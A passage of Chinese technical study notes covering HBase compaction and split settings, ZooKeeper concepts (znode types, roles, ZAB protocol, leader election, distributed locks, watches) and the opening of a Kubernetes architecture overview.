5.（**hbase.hregion.preclose.flush.size**）默认为：5M
当一个 region 中的 memstore 的大小大于这个值的时候，我们又触发了region的 close时，会先运行“pre-flush”操作，清理这个需要关闭的memstore，然后 将这个 region 下线。当一个 region 下线了，我们无法再进行任何写操作。 如果一个 memstore 很大的时候，flush 操作会消耗很多时间。"pre-flush" 操作意味着在 region 下线之前，会先把 memstore 清空。这样在最终执行 close 操作的时候，flush 操作会很快。

6.（**hbase.hstore.compactionThreshold**）默认：超过3个
一个store里面允许存的hfile的个数，超过这个个数会被写到新的一个hfile里面 也即是每个region的每个列族对应的memstore在flush为hfile的时候，默认情况下当超过3个hfile的时候就会对这些文件进行合并重写为一个新文件，设置个数越大可以减少触发合并的时间，但是每次合并的时间就会越长

#### compact机制

把小的storeFile文件合并成大的HFile文件。
清理过期的数据，包括删除的数据
将数据的版本号保存为1个。

#### split机制

当HRegion达到阈值，会把过大的HRegion一分为二。
默认一个HFile达到10Gb的时候就会进行切分。

# zookeeper

## 基本介绍

ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，它是集群的管理者，监视着集群中各个节点的状态根据节点提交的反馈进行下一步合理操作。最终，将简单易用的接口和性能高效、功能稳定的系统提供给用户。
客户端的读请求可以被集群中的任意一台机器处理，如果读请求在节点上注册了监听器，这个监听器也是由所连接的zookeeper机器来处理。对于写请求，这些请求会同时发给其他zookeeper机器并且达成一致后，请求才会返回成功。因此，随着zookeeper的集群机器增多，读请求的吞吐会提高但是写请求的吞吐会下降。
有序性是zookeeper中非常重要的一个特性，所有的更新都是全局有序的，每个更新都有一个唯一的时间戳，这个时间戳称为zxid（Zookeeper Transaction Id）。而读请求只会相对于更新有序，也就是读请求的返回结果中会带有这个zookeeper最新的zxid。

- ZooKeeper主要**服务于分布式系统**，可以用ZooKeeper来做：统一配置管理、统一命名服务、分布式锁、集群管理。
- 使用分布式系统就无法避免对节点管理的问题(需要实时感知节点的状态、对节点进行统一管理等等)，而由于这些问题处理起来可能相对麻烦和提高了系统的复杂性，ZooKeeper作为一个能够**通用**解决这些问题的中间件就应运而生了。

## 基本结构

ZooKeeper的数据结构，跟Unix文件系统非常类似，可以看做是一颗**树**，每个节点叫做**ZNode**。每一个节点可以通过**路径**来标识，结构图如下：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/2BGWl1qPxib1WCfFk2icxudIMHNPQMHIDJjsfAkwgiaM65BadDL48V0tZOYgAWnKaZdadIJVC737xDyuC03euxGGg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)ZooKeeper结构图

那ZooKeeper这颗"树"有什么特点呢？？ZooKeeper的节点我们称之为**Znode**，Znode分为**两种**类型：

- **短暂/临时(Ephemeral)**：当客户端和服务端断开连接后，所创建的Znode(节点)**会自动删除**
- **持久(Persistent)**：当客户端和服务端断开连接后，所创建的Znode(节点)**不会删除**

> ZooKeeper和Redis一样，也是C/S结构(分成客户端和服务端)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/2BGWl1qPxib1WCfFk2icxudIMHNPQMHIDJmuRxxsRwItFUKDia5G8CH3cf0KKBCicF16JfrMlTtFtACqPufScuTrJA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)												Znode和Znode的类型

在上面我们已经简单知道了ZooKeeper的数据结构了，ZooKeeper还配合了**监听器**才能够做那么多事的。

**常见**的监听场景有以下两项：

- 监听Znode节点的**数据变化**
- 监听子节点的**增减变化**没错，通过**监听+Znode节点(持久/短暂[临时])**，ZooKeeper就可以玩出这么多花样了。

没错，通过**监听+Znode节点(持久/短暂[临时])**，ZooKeeper就可以玩出这么多花样了。

## zookeeper角色

**leader**：

1. 一个 Zookeeper 集群同一时间只会有一个实际工作的 Leader，它会发起并维护与各 Follwer 及Observer间的心跳。

2. 所有的写操作必须要通过 Leader 完成再由 Leader 将写操作广播给其它服务器。只要有超过 半数节点（不包括observeer节点）写入成功，该写请求就会被提交（类 2PC 协议）。

**Follower**

1. 一个Zookeeper集群可能同时存在多个Follower，它会响应Leader的心跳

2. Follower可直接处理并返回客户端的读请求，同时会将写请求转发给Leader处理

3. 并且负责在Leader处理写请求时对请求进行投票。

**Observer**

角色与Follower类似，但是无投票权。

Zookeeper需保证高可用和强一致性，为了支持更多的客户端，需要增加更多 Server；Server 增多，投票阶段延迟增大，影响性能；引入 Observer， Observer不参与投票； Observers接受客户端的连接，并将写请求转发给leader节点； 加入更多Observer节点，提高伸缩性，同时不影响吞吐率。

## zookeeper特点

![万字详解 Zookeeper 的五个核心知识点](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4572113566814c6fa1008802bff9d784~tplv-k3u1fbpfcp-watermark.awebp)

1. **集群**：Zookeeper是一个领导者（Leader），多个跟随者（Follower）组成的集群。
2. **高可用性**：集群中只要有半数以上节点存活，Zookeeper集群就能正常服务。
3. **全局数据一致**：每个Server保存一份相同的数据副本，Client无论连接到哪个Server，数据都是一致的。
4. **更新请求顺序进行**：来自同一个Client的更新请求按其发送顺序依次执行。
5. **数据更新原子性**：一次数据更新要么成功，要么失败。
6. **实时性**：在一定时间范围内，Client能读到最新数据。
7. 从设计模式角度来看，zk是一个基于**观察者设计模式**的框架，它负责管理跟存储大家都关心的数据，然后接受观察者的注册，数据反生变化zk会通知在zk上注册的观察者做出反应。
8. Zookeeper是一个分布式协调系统，满足CP性，跟SpringCloud中的Eureka满足AP不一样。

> 分布式协调系统：Leader会同步数据到follower，用户请求可通过follower得到数据，这样不会出现单点故障，并且只要同步时间无限短，那这就是个好的 分布式协调系统。
>
> CAP原则又称CAP定理，指的是在一个分布式系统中，一致性（Consistency）、可用性（Availability）、分区容错性（Partition tolerance）。CAP 原则指的是，这三个要素最多只能同时实现两点，不可能三者兼顾。

## zookeeper ID

**zxid**：

![万字详解 Zookeeper 的五个核心知识点](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d9c7ae488fb1441c9adcae17301d2db7~tplv-k3u1fbpfcp-watermark.awebp)

**ZooKeeper** 采用全局递增的事务 Id 来标识，所有 proposal(提议)在被提出的时候加上了**ZooKeeper Transaction Id** ，zxid是64位的Long类型，**这是保证事务的顺序一致性的关键**。zxid中高32位表示纪元**epoch**，低32位表示事务标识**xid**。你可以认为zxid越大说明存储数据越新。

1. 每个leader都会具有不同的**epoch**值，表示一个纪元/朝代，用来标识 **leader** 周期。每个新的选举开启时都会生成一个新的**epoch**，新的leader产生的话**epoch**会自增，会将该值更新到所有的zkServer的**zxid**和**epoch**，
2. **zxid**是一个依次递增的事务编号。数值越大说明数据越新，所有 proposal（提议）在被提出的时候加上了**zxid**，然后会依据数据库的两阶段过程，首先会向其他的 server 发出事务执行请求，如果超过半数的机器都能执行并且能够成功，那么就会开始执行。

## 基本应用

### 统一配置管理

比如我们现在有三个系统A、B、C，他们有三份配置，分别是`ASystem.yml、BSystem.yml、CSystem.yml`，然后，这三份配置又非常类似，很多的配置项几乎都一样。

- 此时，如果我们要改变其中一份配置项的信息，很可能其他两份都要改。并且，改变了配置项的信息**很可能就要重启系统**

于是，我们希望把`ASystem.yml、BSystem.yml、CSystem.yml`相同的配置项抽取出来成一份**公用**的配置`common.yml`，并且即便`common.yml`改了，也不需要系统A、B、C重启。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/2BGWl1qPxib1WCfFk2icxudIMHNPQMHIDJ3ovGL3PBOyd6m2wtr1C5JhiayZC5Ppibk1zyyQtbQfdl1JZ2FDCQcialw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)系统A、B、C都使用着这份配置

**做法**：我们可以将`common.yml`这份配置放在ZooKeeper的Znode节点中，系统A、B、C监听着这个Znode节点有无变更，如果变更了，**及时**响应。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/2BGWl1qPxib1WCfFk2icxudIMHNPQMHIDJkMbN7WO6ITfDPHtO09zibW532otIiaLlw5vAsvtPth0FNrz4dInibPEKA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)系统A、B、C监听着ZooKeeper的节点，一旦common.yml内容有变化，及时响应

### 统一命名服务

统一命名服务的理解其实跟**域名**一样，是我们为这某一部分的资源给它**取一个名字**，别人通过这个名字就可以拿到对应的资源。

比如说，现在我有一个域名`www.java3y.com`，但我这个域名下有多台机器：

- 192.168.1.1
- 192.168.1.2
- 192.168.1.3
- 192.168.1.4

别人访问`www.java3y.com`即可访问到我的机器，而不是通过IP去访问。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/2BGWl1qPxib1WCfFk2icxudIMHNPQMHIDJDyPibE3x7OFicib01XFjibQKUygiaPTZz5F0vPkedlanemyqKCg7JVyLDlg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)通过名称去访问旗下的IP

### 分布式锁

锁的概念在这我就不说了，如果对锁概念还不太了解的同学，可参考下面的文章

我们可以使用ZooKeeper来实现分布式锁，那是怎么做的呢？？下面来看看：

系统A、B、C都去访问`/locks`节点

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/2BGWl1qPxib1WCfFk2icxudIMHNPQMHIDJNqt17v32q9icicE67f9UVYHbseicaUYZgmy1ObqichHm54LLicXRFSGBcMQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)系统A、B、C都去访问locks节点

访问的时候会创建**带顺序号的临时/短暂**(`EPHEMERAL_SEQUENTIAL`)节点，比如，系统A创建了`id_000000`节点，系统B创建了`id_000002`节点，系统C创建了`id_000001`节点。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/2BGWl1qPxib1WCfFk2icxudIMHNPQMHIDJczzKQ6bLPE3Buwib1YJeqluPWicmZUbPadvFCU6UopDDkajKQu1FLO3A/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)创建出临时带顺序号的节点

接着，拿到`/locks`节点下的所有子节点(id_000000,id_000001,id_000002)，**判断自己创建的是不是最小的那个节点**

- 如果是，则拿到锁。

- - 释放锁：执行完操作后，把创建的节点给删掉

- 如果不是，则监听比自己要小1的节点变化

举个例子：

- 系统A拿到`/locks`节点下的所有子节点，经过比较，发现自己(`id_000000`)，是所有子节点最小的。所以得到锁
- 系统B拿到`/locks`节点下的所有子节点，经过比较，发现自己(`id_000002`)，不是所有子节点最小的。所以监听比自己小1的节点`id_000001`的状态
- 系统C拿到`/locks`节点下的所有子节点，经过比较，发现自己(`id_000001`)，不是所有子节点最小的。所以监听比自己小1的节点`id_000000`的状态
- ……
- 等到系统A执行完操作以后，将自己创建的节点删除(`id_000000`)。通过监听，系统C发现`id_000000`节点已经删除了，发现自己已经是最小的节点了，于是顺利拿到锁
- ….系统B如上

#### ZooKeeper分布式锁的优点和缺点

总结一下ZooKeeper分布式锁：

（1）优点：ZooKeeper分布式锁（如InterProcessMutex），能有效的解决分布式问题，不可重入问题，使用起来也较为简单。

（2）缺点：ZooKeeper实现的分布式锁，性能并不太高。为啥呢？
因为每次在创建锁和释放锁的过程中，都要动态创建、销毁瞬时节点来实现锁功能。大家知道，ZK中创建和删除节点只能通过Leader服务器来执行，然后Leader服务器还需要将数据同不到所有的Follower机器上，这样频繁的网络通信，性能的短板是非常突出的。

总之，在高性能，高并发的场景下，不建议使用ZooKeeper的分布式锁。而由于ZooKeeper的高可用特性，所以在并发量不是太高的场景，推荐使用ZooKeeper的分布式锁。

在目前分布式锁实现方案中，比较成熟、主流的方案有两种：

（1）基于Redis的分布式锁

（2）基于ZooKeeper的分布式锁

两种锁，分别适用的场景为：

（1）基于ZooKeeper的分布式锁，适用于高可靠（高可用）而并发量不是太大的场景；

（2）基于Redis的分布式锁，适用于并发量很大、性能要求很高的、而可靠性问题可以通过其他方案去弥补的场景。

### 集群状态

经过上面几个例子，我相信大家也很容易想到ZooKeeper是怎么"**感知**"节点的动态新增或者删除的了。

还是以我们三个系统A、B、C为例，在ZooKeeper中创建**临时节点**即可：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/2BGWl1qPxib1WCfFk2icxudIMHNPQMHIDJ4lnbuRg5lEDmjlSTmdarCs8Dq7Pjg213pAq7QlXxzc7dIklkGuAWYQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)各维护一个临时节点

只要系统A挂了，那`/groupMember/A`这个节点就会删除，通过**监听**`groupMember`下的子节点，系统B和C就能够感知到系统A已经挂了。(新增也是同理)

除了能够感知节点的上下线变化，ZooKeeper还可以实现**动态选举Master**的功能。(如果集群是主从架构模式下)

原理也很简单，如果想要实现动态选举Master的功能，Znode节点的类型是带**顺序号的临时节点**(`EPHEMERAL_SEQUENTIAL`)就好了。

- Zookeeper会每次选举最小编号的作为Master，如果Master挂了，自然对应的Znode节点就会删除。然后让**新的最小编号作为Master**，这样就可以实现动态选举的功能了。

### Zookeeper队列管理（文件系统、通知机制）

两种类型的队列：
1、同步队列，当一个队列的成员都聚齐时，这个队列才可用，否则一直等待所有成员到达。 
2、队列按照 FIFO 方式进行入队和出队操作。 
第一类，在约定目录下创建临时目录节点，监听节点数目是否是我们要求的数目。 
第二类，和分布式锁服务中的控制时序场景基本原理一致，入列有编号，出列按编号。在特定的目录下创建**PERSISTENT_SEQUENTIAL**节点，创建成功时**Watcher**通知等待的队列，队列删除**序列号最小的节点**用以消费。此场景下Zookeeper的znode用于消息存储，znode存储的数据就是消息队列中的消息内容，SEQUENTIAL序列号就是消息的编号，按序取出即可。由于创建的节点是持久化的，所以**不必担心队列消息的丢失问题**。

## zookeeper提供了什么

1、文件系统
2、通知机制

## zookeeper的文件系统

Zookeeper提供一个多层级的节点命名空间（节点称为znode）。与文件系统不同的是，这些节点都可以设置关联的数据，而文件系统中只有文件节点可以存放数据而目录节点不行。Zookeeper为了保证高吞吐和低延迟，在内存中维护了这个树状的目录结构，这种特性使得Zookeeper不能用于存放大量的数据，每个节点的存放数据上限为1M。

## 四种类型的znode

1、PERSISTENT-持久化目录节点 
客户端与zookeeper断开连接后，该节点依旧存在 
2、PERSISTENT_SEQUENTIAL-持久化顺序编号目录节点
客户端与zookeeper断开连接后，该节点依旧存在，只是Zookeeper给该节点名称进行顺序编号 
3、EPHEMERAL-临时目录节点
客户端与zookeeper断开连接后，该节点被删除 
4、EPHEMERAL_SEQUENTIAL-临时顺序编号目录节点
客户端与zookeeper断开连接后，该节点被删除，只是Zookeeper给该节点名称进行顺序编号
![clipboard.png](https://segmentfault.com/img/bV8Xel?w=371&h=463)

## zookeeper的通知机制

client端会对某个znode建立一个watcher事件，当该znode发生变化时，这些client会收到zk的通知，然后client可以根据znode变化来做出业务上的改变等。

## Zookeeper数据复制

Zookeeper作为一个集群提供一致的数据服务，自然，它要在**所有机器间**做数据复制。数据复制的好处： 
1、容错：一个节点出错，不致于让整个系统停止工作，别的节点可以接管它的工作； 
2、提高系统的扩展能力 ：把负载分布到多个节点上，或者增加节点来提高系统的负载能力； 
3、提高性能：让**客户端本地访问就近的节点，提高用户访问速度**。

从客户端读写访问的透明度来看，数据复制集群系统分下面两种： 
1、**写主**(WriteMaster) ：对数据的**修改提交给指定的节点**。读无此限制，可以读取任何一个节点。这种情况下客户端需要对读与写进行区别，俗称**读写分离**； 
2、**写任意**(Write Any)：对数据的**修改可提交给任意的节点**，跟读一样。这种情况下，客户端对集群节点的角色与变化透明。

对zookeeper来说，它采用的方式是**写任意**。通过增加机器，它的读吞吐能力和响应能力扩展性非常好，而写，随着机器的增多吞吐能力肯定下降（这也是它建立observer的原因），而响应能力则取决于具体实现方式，是**延迟复制保持最终一致性**，还是**立即复制快速响应**。

## zookeeper的ZAB协议

ZAB (Zookeeper Atomic Broadcast **原子广播协议**) 协议是为分布式协调服务ZooKeeper专门设计的一种支持**崩溃恢复**的一致性协议。基于该协议，ZooKeeper 实现了一种主从模式的系统架构来保持集群中各个副本之间的数据一致性。

分布式系统中leader负责外部客户端的**写**请求。follower服务器负责**读跟同步**。这时需要解决俩问题。

1. Leader 服务器是如何把数据更新到所有的Follower的。
2. Leader 服务器突然间失效了，集群咋办？

因此ZAB协议为了解决上面两个问题而设计了两种工作模式，整个 Zookeeper 就是在这两个模式之间切换：

1. 原子广播模式：把数据更新到所有的follower。
2. 崩溃恢复模式：Leader发生崩溃时，如何恢复。

### 原子广播模式

你可以认为消息广播机制是简化版的 2PC协议，就是通过如下的机制**保证事务的顺序一致性**的。

![万字详解 Zookeeper 的五个核心知识点](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/44db8b073c5f4fbcb13c68a56f1a4c12~tplv-k3u1fbpfcp-watermark.awebp)

1. **leader**从客户端收到一个写请求后生成一个新的事务并为这个事务生成一个唯一的ZXID，
2. **leader**将将带有 **zxid** 的消息作为一个提案(**proposal**)分发给所有 **FIFO**队列。
3. **FIFO**队列取出队头**proposal**给**follower**节点。
4. 当 **follower** 接收到 **proposal**，先将 **proposal** 写到硬盘，写硬盘成功后再向 **leader** 回一个 **ACK**。
5. **FIFO**队列把ACK返回给**Leader**。
6. 当**leader**收到超过一半以上的**follower**的**ack**消息，**leader**会进行**commit**请求，然后再给**FIFO**发送**commit**请求。
7. 当**follower**收到**commit**请求时，会判断该事务的**ZXID**是不是比历史队列中的任何事务的**ZXID**都小，如果是则提交，如果不是则等待比它更小的事务的**commit**(保证顺序性)

### 崩溃恢复

消息广播过程中，Leader 崩溃了还能保证数据一致吗？当 **Leader** 崩溃会进入崩溃恢复模式。其实主要是对如下两种情况的处理。

1. **Leader** 在复制数据给所有 **Follwer** 之后崩溃，咋搞？
2. **Leader** 在收到 Ack 并提交了自己，同时发送了部分 **commit** 出去之后崩溃咋办？

针对此问题，ZAB 定义了 2 个原则：

1. ZAB 协议确保执行那些已经在 Leader 提交的事务最终会被所有服务器提交。
2. ZAB 协议确保丢弃那些只在 Leader 提出/复制，但没有提交的事务。

至于如何实现**确保提交已经被 Leader 提交的事务，同时丢弃已经被跳过的事务**呢？关键点就是依赖上面说到过的 **ZXID**了。

## zookeeper是如何保证事务的顺序一致性的？

zookeeper采用了**递增的事务Id**来标识，所有的proposal（提议）都在被提出的时候加上了zxid，zxid实际上是一个64位的数字，高32位是epoch（时期; 纪元; 世; 新时代）用来标识leader是否发生改变，如果有新的leader产生出来，epoch会自增，**低32位用来递增计数**。当新产生proposal的时候，会依据数据库的两阶段过程，首先会向其他的server发出事务执行请求，如果超过半数的机器都能执行并且能够成功，那么就会开始执行。

## Zookeeper 下 Server工作状态

每个Server在工作过程中有三种状态： 
LOOKING：当前Server**不知道leader是谁**，正在搜寻
LEADING：当前Server即为选举出来的leader
FOLLOWING：leader已经选举出来，当前Server与之同步

## zookeeper是如何选取主leader的？

当leader崩溃或者leader失去大多数的follower，这时zk进入恢复模式，恢复模式需要重新选举出一个新的leader，让所有的Server都恢复到一个正确的状态。Zk的选举算法有两种：一种是基于basic paxos实现的，另外一种是基于fast paxos算法实现的。系统默认的选举算法为**fast paxos**。

![万字详解 Zookeeper 的五个核心知识点](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fb31e8bfdf3d40279a542f9108ac7c42~tplv-k3u1fbpfcp-watermark.awebp)

我们以上面的5台机器为例，只有超过半数以上，即最少启动3台服务器，集群才能正常工作。

1. 服务器1启动，发起一次选举。

> 服务器1投自己一票。此时服务器1票数一票，不够半数以上（3票），选举无法完成，服务器1状态保持为**LOOKING**。

2. 服务器2启动，再发起一次选举。

> 服务器1和2分别投自己一票，此时服务器1发现服务器2的id比自己大，更改选票投给服务器2。此时服务器1票数0票，服务器2票数2票，不够半数以上（3票），选举无法完成。服务器1，2状态保持**LOOKING**。

3. 服务器3启动，发起一次选举。

> 与上面过程一样，服务器1和2先投自己一票，然后因为服务器3id最大，两者更改选票投给为服务器3。此次投票结果：服务器1为0票，服务器2为0票，服务器3为3票。此时服务器3的票数已经超过半数（3票），服务器3当选**Leader**。服务器1，2更改状态为**FOLLOWING**，服务器3更改状态为**LEADING**；

4. 服务器4启动，发起一次选举。

> 此时服务器1、2、3已经不是**LOOKING**状态，不会更改选票信息，交换选票信息结果。服务器3为3票，服务器4为1票。此时服务器4服从多数，更改选票信息为服务器3，服务器4并更改状态为**FOLLOWING**。

5. 服务器5启动，发起一次选举

> 同4一样投票给3，此时服务器3一共5票，服务器5为0票。服务器5并更改状态为**FOLLOWING**；

6. 最终

> **Leader**是服务器3，状态为**LEADING**。其余服务器是**Follower**，状态为**FOLLOWING**。

2、Zookeeper选主流程(basic paxos)运行时候如果Master节点崩溃了会走恢复模式，新Leader选出前会暂停对外服务，大致可以分为四个阶段 选举、发现、同步、广播。

![万字详解 Zookeeper 的五个核心知识点](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8e528772ef6449cb9c096c3ab3a30e79~tplv-k3u1fbpfcp-watermark.awebp)

1. 每个Server会发出一个投票，第一次都是投自己，其中投票信息 = (myid，ZXID)
2. 收集来自各个服务器的投票
3. 处理投票并重新投票，处理逻辑：**优先比较ZXID，然后比较myid**。
4. 统计投票，只要超过半数的机器接收到同样的投票信息，就可以确定leader，注意epoch的增加跟同步。
5. 改变服务器状态Looking变为Following或Leading。
6. 当 Follower 链接上 Leader 之后，Leader 服务器会根据自己服务器上最后被提交的 ZXID 和 Follower 上的 ZXID 进行比对，比对结果要么回滚，要么和 Leader 同步，保证集群中各个节点的事务一致。
7. 集群恢复到广播模式，开始接受客户端的写请求。

## 脑裂问题

脑裂问题是集群部署必须考虑的一点，比如在Hadoop跟Spark集群中。而ZAB为解决脑裂问题，要求集群内的节点数量为2N+1。当网络分裂后，始终有一个集群的节点数量**过半数**，而另一个节点数量小于N+1, 因为选举Leader需要过半数的节点同意，所以我们可以得出如下结论：

> 有了过半机制，对于一个Zookeeper集群，要么没有Leader，要没只有1个Leader，这样就避免了脑裂问题

## zookeeper同步流程

选完Leader以后，zk就进入状态同步过程。 
1、Leader等待server连接； 
2、Follower连接leader，将最大的zxid发送给leader； 
3、Leader根据follower的zxid确定同步点； 
4、完成同步后通知follower 已经成为uptodate状态； 
5、Follower收到uptodate消息后，又可以重新接受client的请求进行服务了。
![clipboard.png](https://segmentfault.com/img/bV8Xag?w=393&h=155)

## 分布式通知和协调

对于系统调度来说：操作人员发送通知实际是通过控制台**改变某个节点的状态**，**然后zk将这些变化发送给注册了这个节点的watcher的所有客户端**。
对于执行情况汇报：每个工作进程都在某个目录下**创建一个临时节点**。**并携带工作的进度数据**，这样**汇总的进程可以监控目录子节点的变化获得工作进度的实时的全局情况**。

## 机器中为什么会有leader？

在分布式环境中，有些业务逻辑只需要集群中的某一台机器进行执行，**其他的机器可以共享这个结果**，这样可以大大**减少重复计算**，**提高性能**，于是就需要进行leader选举。

## zk节点宕机如何处理？

Zookeeper本身也是集群，推荐配置不少于3个服务器。Zookeeper自身也要保证当一个节点宕机时，其他节点会继续提供服务。
如果是一个Follower宕机，还有2台服务器提供访问，因为Zookeeper上的数据是有多个副本的，数据并不会丢失；
如果是一个Leader宕机，Zookeeper会选举出新的Leader。
ZK集群的机制是只要超过半数的节点正常，集群就能正常提供服务。只有在ZK节点挂得太多，只剩一半或不到一半节点能工作，集群才失效。
所以
3个节点的cluster可以挂掉1个节点(leader可以得到2票>1.5)
2个节点的cluster就不能挂掉任何1个节点了(leader可以得到1票<=1)

## zookeeper负载均衡和nginx负载均衡区别

zk的负载均衡是可以调控，nginx只是能调权重，其他需要可控的都需要自己写插件；但是nginx的吞吐量比zk大很多，应该说按业务选择用哪种方式。

## zookeeper watch机制

Watch机制官方声明：一个Watch事件是一个一次性的触发器，当被设置了Watch的数据发生了改变的时候，则服务器将这个改变发送给设置了Watch的客户端，以便通知它们。
Zookeeper机制的特点：
1、一次性触发数据发生改变时，一个watcher event会被发送到client，但是client**只会收到一次这样的信息**。
2、watcher event异步发送watcher的通知事件从server发送到client是**异步**的，这就存在一个问题，不同的客户端和服务器之间通过socket进行通信，由于**网络延迟或其他因素导致客户端在不通的时刻监听到事件**，由于Zookeeper本身提供了**ordering guarantee，即客户端监听事件后，才会感知它所监视znode发生了变化**。所以我们使用Zookeeper不能期望能够监控到节点每次的变化。Zookeeper**只能保证最终的一致性，而无法保证强一致性**。
3、数据监视Zookeeper有数据监视和子数据监视getdata() and exists()设置数据监视，getchildren()设置了子节点监视。
4、注册watcher **getData、exists、getChildren**
5、触发watcher **create、delete、setData**
6、**setData()**会触发znode上设置的data watch（如果set成功的话）。一个成功的**create()**操作会触发被创建的znode上的数据watch，以及其父节点上的child watch。而一个成功的**delete()**操作将会同时触发一个znode的data watch和child watch（因为这样就没有子节点了），同时也会触发其父节点的child watch。
7、当一个客户端**连接到一个新的服务器上**时，watch将会被以任意会话事件触发。当**与一个服务器失去连接**的时候，是无法接收到watch的。而当client**重新连接**时，如果需要的话，所有先前注册过的watch，都会被重新注册。通常这是完全透明的。只有在一个特殊情况下，**watch可能会丢失**：对于一个未创建的znode的exist watch，如果在客户端断开连接期间被创建了，并且随后在客户端连接上之前又删除了，这种情况下，这个watch事件可能会被丢失。
8、Watch是轻量级的，其实就是本地JVM的**Callback**，服务器端只是存了是否有设置了Watcher的布尔类型。

# k8s

## K8s架构

![k8srebuild](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/58ce6b2977d449d4a9d3cee36ecaf3b5~tplv-k3u1fbpfcp-watermark.awebp)

k8s系统在设计是遵循c-s架构的，也就是我们图中apiserver与其余组件的交互。在生产中通常会有多个Master以实现K8s系统服务高可用。K8s集群至少有一个工作节点，节点上运行 K8s 所管理的容器化应用。

在Master通常上包括 kube-apiserver、etcd 存储、kube-controller-manager、cloud-controller-manager、kube-scheduler 和用于 K8s 服务的 DNS 服务器（插件）。这些对集群做出全局决策(比如调度)，以及检测和响应集群事件的组件集合也称为控制平面。

**其实K8s官方并没有`Master`这一说，只是大多数安装工具（kubeadm）或者脚本为了架构更明了会把控制平面中的组件安装到一台机器上即Master机器，并且不会在此机器上运行用户容器。** 这不是强制性的，所以你也可以对将控制平面实行分布式部署，不过这样的话高可用会是一个不小的挑战。

在Node上组件包括 kubelet 、kube-porxy 以及服务于pod的容器运行时(runtime)。外部storage与registry用于为容器提供存储与镜像仓库服务。

## k8s运行流程

* kubectl 客户端首先将CLI命令转化为RESTful的API调用，然后发送到kube-apiserver。

* kube-apiserver 在验证这些 API 调用后，将任务元信息并存储到etcd，接着调用 kube-scheduler 开始决策一个用于作业的Node节点。

* 一旦 kube-scheduler 返回一个适合调度的目标节点后，kube-apiserver 就把任务的节点信息存入etcd，并创建任务。

* 此时目标节点中的 kubelet正监听apiserver，当监听到有新任务需要调度到本节点后，kubelet通过本地runtime创建任务容器，执行作业。

* 接着kubelet将任务状态等信息返回给apiserver存储到etcd。

* 这样我们的任务已经在运行了，此时control-manager发挥作用保证任务一直是我们期望的状态。

## k8s组件介绍

### 控制面板

**kube-apiserver**

API服务器为K8s集群资源操作提供唯一入口，并提供认证、授权、访问控制、API 注册和发现机制。

Kubernetes API 服务器的主要实现是 kube-apiserver。 kube-apiserver 设计上考虑了水平伸缩，也就是说，它可通过部署多个实例进行伸缩。 你可以运行 kube-apiserver 的多个实例，并在这些实例之间进行流量平衡。

**etcd**

etcd 是兼具一致性和高可用性的键值数据库，可以作为保存 Kubernetes 所有集群数据的后台数据库(例如 Pod 的数量、状态、命名空间等）、API 对象和服务发现细节。 在生产级k8s中etcd通常会以集群的方式存在，安全原因，它只能从 API 服务器访问。

etcd也是k8s生态的关键应用。关于 etcd 可参考 [etcd 文档](https://link.juejin.cn?target=https%3A%2F%2Fetcd.io%2Fdocs%2F)。

**kube-scheduler**

kube-scheduler 负责监视新创建、未指定运行Node的 Pods，决策出一个让pod运行的节点。

例如，如果应用程序需要 1GB 内存和 2 个 CPU 内核，那么该应用程序的 pod 将被安排在至少具有这些资源的节点上。每次需要调度 pod 时，调度程序都会运行。调度程序必须知道可用的总资源以及分配给每个节点上现有工作负载的资源。

调度决策考虑的因素包括单个 Pod 和 Pod 集合的资源需求、硬件/软件/策略约束、亲和性和反亲和性规范、数据位置、工作负载间的干扰和最后时限。

**kube-controller-manager**

k8s在后台运行许多不同的控制器进程，当服务配置发生更改时（例如，替换运行 pod 的镜像，或更改配置 yaml 文件中的参数），控制器会发现更改并开始朝着新的期望状态工作。

从逻辑上讲，每个控制器都是一个单独的进程， 但是为了降低复杂性，它们都被编译到同一个可执行文件，并在一个进程中运行。

控制器包括:

- 节点控制器（Node Controller）: 负责在节点出现故障时进行通知和响应
- 任务控制器（Job controller）: 监测代表一次性任务的 Job 对象，然后创建 Pods 来运行这些任务直至完成
- 端点控制器（Endpoints Controller）: 填充端点(Endpoints)对象(即加入 Service 与 Pod)
- 服务帐户和令牌控制器（Service Account & Token Controllers）: 为新的命名空间创建默认帐户和 API 访问令牌

**cloud-controller-manager**

云控制器管理器使得你可以将你的集群连接到云提供商的 API 之上， 同时可以将云平台交互组件与本地集群中组件分离。

`cloud-controller-manager` 仅运行特定于云平台的控制回路。 如果我们在自己的环境中运行 Kubernetes，大多数时候非混合云环境是用不到这个组件的。

与 `kube-controller-manager` 类似，`cloud-controller-manager` 将若干逻辑上独立的 控制回路组合到同一个可执行文件中，供你以同一进程的方式运行。 你可以对其执行水平扩容（运行不止一个副本）以提升性能或者增强容错能力。

下面的控制器都包含对云平台驱动的依赖：

- 节点控制器（Node Controller）: 用于在节点终止响应后检查云提供商以确定节点是否已被删除
- 路由控制器（Route Controller）: 用于在底层云基础架构中设置路由
- 服务控制器（Service Controller）: 用于创建、更新和删除云提供商负载均衡器

### Node中节点

节点组件在每个节点上运行，维护运行的 Pod 并提供 Kubernetes 运行环境。

#### kubelet
